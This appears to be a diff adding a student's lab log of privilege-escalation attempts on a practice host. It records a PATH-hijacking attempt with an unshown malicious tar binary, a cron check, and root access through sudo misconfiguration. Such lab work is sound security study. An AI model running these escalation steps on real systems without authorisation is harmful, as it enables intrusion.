@@ -1,0 +1,92 @@
+Day 16 — Privilege Escalation Attempts
+
+# Initial access
+
+ssh msfadmin@192.168.56.101
+
+# Verify user context
+
+whoami
+id
+
+# =========================
+# Attempt 1: PATH Hijacking
+# =========================
+
+# Inspect backup script
+
+cat /usr/local/bin/backup.sh
+
+# Check tar location
+
+which tar
+
+# Prepare malicious tar binary
+
+cd /tmp
+nano tar
+chmod +x /tmp/tar
+
+# Manipulate PATH
+
+export PATH=/tmp:$PATH
+echo $PATH
+
+# Execute backup script with sudo
+
+sudo ./backup.sh
+
+# Verify privileges
+
+whoami
+id
+
+# Result: FAILED — no privilege escalation
+
+# =========================
+# Attempt 2: Cron Job Abuse
+# =========================
+
+# Inspect system crontab
+
+cat /etc/crontab
+
+# Review backup script again
+
+cat /usr/local/bin/backup.sh
+
+# Result: FAILED — no writable cron-executed files
+
+# =========================
+# Final Attempt: Sudo Misconfiguration
+# =========================
+
+# Enumerate sudo permissions
+
+sudo -l
+
+# Spawn root shell
+
+sudo -i
+
+# Verify root
+
+whoami
+id
+
+# Exit root shell
+
+exit
+
+# Alternative sudo method
+
+sudo su -
+
+# Verify root again
+
+whoami
+id
+
+# Exit root shell
+
+exit
